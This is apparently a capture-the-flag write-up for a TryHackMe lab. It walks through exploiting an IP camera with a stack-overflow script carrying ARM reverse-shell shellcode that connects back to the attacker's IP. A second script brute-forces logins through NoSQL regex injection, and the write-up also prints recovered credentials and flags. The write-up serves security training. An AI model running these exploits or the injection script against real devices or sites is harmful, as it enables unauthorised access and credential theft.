# Snowy ARMageddon

This SideQuest can be found here: https://tryhackme.com/room/armageddon2r

## 1. What is the content of the first flag?

Starting of with a port scan on the provided IP address, we find port 22, 23, 8080 and 50628 which is definitely not a commonly found port.  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/1f52fcc7-0caf-4d1f-8084-c83dc51c7a7e)

Looking at it in the browser, we can see it's a Wireless Streaming Camera:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/161ebb0a-0906-4b5e-bfc7-a107759ae86c)

A quick google search for any exploits for this camera, we can see an ARM challenge which seems to match up with the ARM that's capitalized in the challenge description. So we must be on the right track.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/3b2f41f9-42e8-43c1-9e30-1bbefb722891)

The description and details of the challenge can be found [here](https://no-sec.net/arm-x-challenge-breaking-the-webs/). Within this blog post we find that the camera is vulnerable to a Stack Overflow and we already have a python script for it. The challenging part was getting my attacker IP converted to ARM shellcode properly. I was not able to do that but I collaborated with a talented hacker by the name [william-barros-costa](https://github.com/william-barros-costa) who was able to manually convert my VPN IP to the shellcode needed for the foothold.

```python
from pwn import *
import sys
   
HOST = str(sys.argv[1])
PORT = 50628
LPORT = 4444
 
BADCHARS = b'\x00\x09\x0a\x0d\x20\x23\x26'
BAD = False
LIBC_OFFSET = 0x40021000
LIBGCC_OFFSET = 0x4000e000
RETURN = LIBGCC_OFFSET + 0x2f88    # libgcc_s.so.1: bx sp   0x40010f88
SLEEP = LIBC_OFFSET + 0xdc54    # sleep@libc 0x4002ec54
 
pc = cyclic_find(0x63616176)  # 284
r4 = cyclic_find(0x6361616f)  # 256
r5 = cyclic_find(0x63616170)  # 260
r6 = cyclic_find(0x63616171)  # 264
r7 = cyclic_find(0x63616172)  # 268
r8 = cyclic_find(0x63616173)  # 272
r9 = cyclic_find(0x63616174)  # 276
r10 = cyclic_find(0x63616175) # 280
sp = cyclic_find(0x63616177)  # 288
 
SC  = b'\x10\xd0\x4d\xe2'     # sub sp, 16
SC += b'\x68\x10\xa0\xe3\x01\x14\xa0\xe1\x73\x10\x81\xe2\x01\x14\xa0\xe1\x2f\x10\x81\xe2\x04\x10\x2d\xe5\x6e\x10\xa0\xe3\x01\x14\xa0\xe1\x69\x10\x81\xe2\x01\x14\xa0\xe1\x62\x10\x81\xe2\x01\x14\xa0\xe1\x2f\x10\x81\xe2\x04\x10\x2d\xe5'      # /bin/sh
SC += b'\x01\x10\x21\xe0\xce\x10\x81\xe2\x01\x14\xa0\xe1\x5f\x10\x81\xe2\x01\x14\xa0\xe1\x06\x10\x81\xe2\x81\x13\xa0\xe1\x05\x10\x81\xe2\x81\x10\xa0\xe1\x04\x10\x2d\xe5'  #10.6.95.206
SC += b'\x5c\x10\xa0\xe3\x01\x14\xa0\xe1\x11\x10\x81\xe2\x01\x18\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5'   # 4444; AF_INET, SOCK_STREAM
SC += b'\xef\x30\xa0\xe3\x03\x3c\xa0\xe1\x04\x30\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x0c\x10\x81\xe2\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe9\x10\xa0\xe3\x01\x14\xa0\xe1\x2d\x10\x81\xe2\x01\x18\xa0\xe1\x05\x10\x81\xe2\x04\x10\x2d\xe5\xe0\x10\xa0\xe3\x01\x14\xa0\xe1\x22\x10\x81\xe2\x01\x14\xa0\xe1\x1f\x10\x81\xe2\x01\x10\x81\xe2\x01\x14\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x8f\x10\x81\xe2\x01\x18\xa0\xe1\x18\x10\x81\xe2\x04\x10\x2d\xe5'   # execve()
SC += b'\x04\x30\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x18\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5'   # dup2(STDERR)
SC += b'\x04\x30\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x18\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5'   # dub2(STDOUT)
SC += b'\x04\x30\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x87\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x0e\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x31\x10\x81\xe2\x04\x10\x2d\xe5\xe0\x10\xa0\xe3\x01\x14\xa0\xe1\x21\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x18\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5'   # dup2(STDIN)
SC += b'\x04\x30\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x87\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x1c\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\xff\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x1f\x10\x81\xe2\x01\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x04\x10\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x8f\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x50\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\xb0\x10\x81\xe2\x01\x14\xa0\xe1\x04\x10\x2d\xe5'   # connect()
SC += b'\x04\x30\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x87\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x1a\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\xff\x10\x81\xe2\x04\x10\x2d\xe5\xe0\x10\xa0\xe3\x01\x14\xa0\xe1\x22\x10\x81\xe2\x01\x14\xa0\xe1\x1f\x10\x81\xe2\x01\x10\x81\xe2\x01\x14\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x81\x10\x81\xe2\x01\x18\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5'   # socket()
#SC += b'\x01\x0c\xa0\xe3'   # mov r0, #256  ; sleep for 256s to avoid cache coherency issues
#SC += b'\x3a\xff\x2f\xe1'   # blx r10       ; r10 contains address of sleep@libc
SC += b'\x1d\xff\x2f\xe1'   # bx sp
 
info('Shellcode length: %d' % len(SC))
for i in range(len(SC)):
  if SC[i] in BADCHARS:
    print('BAD CHARACTER in position: %d!')
    BAD = True
if BAD:
  exit(1)
 
buffer  = b'A' * r10
buffer += p32(SLEEP)    # overwrite r10 with address of sleep()
buffer += p32(RETURN)   # bx sp
buffer += SC
 
s = remote(HOST, 50628)
s.send(b'GET /en/login.asp?basic=' + buffer + b' HTTP/1.0\r\n\r\n')
 
nc = listen(LPORT)
nc.wait_for_connection()
nc.interactive()
s.close()
nc.close()
```
Once inside the machine, we start ennumerating (a lot) and soon-ish find a password in /var/etc/umconfig.txt:  
![image](https://github.com/LazyTitan33/myCreations/assets/80063008/74c54aef-e394-45e7-a3fe-b3517e1de252)

Y3tiStarCur!ouspassword=admin

We can use these creds to login the camera dashboard and see the first flag:  
![image](https://github.com/LazyTitan33/myCreations/assets/80063008/1bfd121c-5fff-431b-8ab9-dffc5f6bdd15)

`THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}`

## 2. What is the content of the yetikey2.txt file?

Going back on port 8080, we find a seemingly unaccesable page:  
![image](https://github.com/LazyTitan33/myCreations/assets/80063008/c4f867a8-4339-4b87-9337-dfc3ffb3880e)

However, if we use `ffuf` to fuzz for files with any of the raft wordlists from seclists, but also add another slash at the end, we find that the login page is accessible:  
![image](https://github.com/LazyTitan33/myCreations/assets/80063008/00ca1ea3-41c6-4417-9c45-54cb819365bc)

Multiple different attempts were made to bypass the login and then we noticed this error which confirms a NoSQL database being used in the background:  
![image](https://github.com/LazyTitan33/myCreations/assets/80063008/54053351-d2cb-4d46-9549-0b93131a564e)

I grabbed [this](https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login) script from hacktricks and modified it a bit to start enumerating. As you can see from the commented code, I enumerated users first based on the number of characters in the password.

```python
import requests
import string

url = " http://10.10.29.186:8080/login.php/"
proxy = {"http":"http://127.0.0.1:8080"}
headers = {'Content-type': 'application/x-www-form-urlencoded'}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":""}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, proxies=proxy, verify=False, allow_redirects=False)
            if 'Invalid' not in pr.text:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames():
    # usernames = ['Blizzardson','Frostbite', 'Grinchenko', 'Iciclevich', 'Northpolinsky','Scroogestein', 'Tinselova'] #users found with exactly 20 chars in the password (.{20})
    # usernames = ['Frosteau'] #users found with less than 20 chars in the password (^.{1,19}$)
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":"^.{21,}$"} #regex to search users with more than 20 chars in the password
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, proxies=proxy, verify=False, allow_redirects=False)
        if 'Invalid' not in pr.text:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, proxies=proxy, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames


for u in get_usernames():
    get_password(u)
```
After finding the usernames, the script automatically starts abusing the NoSQL injection to also get their passwords. The only one out of the ordinary seems to be the user `Frosteau` which has a password that's lower than 20 characters. Everyone else has the password set at 20 characters.

`Frosteau:HoHoHacked`

Using these credentials to login, we get redirects to the root website which again, tells us that we are forbidden. However, we need to keep in mind the slash trick at the end, which is a misconfiguration in the apache server. Adding the slash at the end of /index.php/ we get directed to the dashboard which has the content of the yetikey2.txt:  
![image](https://github.com/LazyTitan33/myCreations/assets/80063008/3779b5f7-6659-4ff0-bccb-e5daaa66c6d7)

`2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK`
